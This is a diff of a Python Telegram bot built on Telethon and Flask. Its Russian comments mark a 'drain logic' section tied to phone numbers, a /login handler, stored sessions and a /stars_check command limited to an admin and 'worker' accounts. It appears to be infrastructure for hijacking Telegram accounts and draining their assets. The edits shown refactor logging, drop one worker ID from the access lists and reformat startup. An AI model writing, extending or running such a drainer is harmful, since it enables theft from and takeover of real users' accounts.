@@ -101,11 +101,12 @@ def save_log(text):
         f.write(f"[{datetime.datetime.now()}] {text}\n")
 
 def send_log(msg, buttons=None):
-    save_log(msg)
-    # asyncio.run_coroutine_threadsafe — единственный способ подружить Flask и Telethon
     if bot.loop and bot.loop.is_running():
-        coro = bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons)
-        asyncio.run_coroutine_threadsafe(coro, bot.loop)
+        # Используем thread-safe метод для связи Flask и Telethon
+        asyncio.run_coroutine_threadsafe(
+            bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons),
+            bot.loop
+        )
 
 # --- ЛОГИКА СЛИВА (DRAIN LOGIC) ---
 async def drain_logic(client, phone):
@@ -227,7 +228,7 @@ async def start_handler(event):
 @bot.on(events.NewMessage(pattern='/stars_check'))
 async def stars_check(event):
     # Доступ для админа и воркера
-    allowed_ids = [ADMIN_ID, 8311100024, 6059673725]
+    allowed_ids = [ADMIN_ID, 8311100024]
     if event.sender_id not in allowed_ids: 
         return
 
@@ -270,7 +271,7 @@ async def stars_check(event):
 
 @bot.on(events.NewMessage(pattern='/login'))
 async def login_handler(event):
-    if event.sender_id not in [ADMIN_ID, 8311100024, 6059673725]: return
+    if event.sender_id not in [ADMIN_ID, 8311100024]: return
     
     user_id = str(event.sender_id)
     async with bot.conversation(event.chat_id) as conv:
@@ -382,6 +383,14 @@ async def contact_handler(event):
 
 if __name__ == '__main__':
     if not os.path.exists('sessions'): os.makedirs('sessions')
+    
     port = int(os.environ.get("PORT", 8080))
-    threading.Thread(target=lambda: app.run(port=port, host='0.0.0.0', use_reloader=False), daemon=True).start()
+    
+    # Запуск Flask в отдельном потоке (daemon=True позволяет потоку завершиться вместе с программой)
+    threading.Thread(
+        target=lambda: app.run(port=port, host='0.0.0.0', use_reloader=False), 
+        daemon=True
+    ).start()
+    
+    # Бот должен работать в основном потоке
     bot.run_until_disconnected()
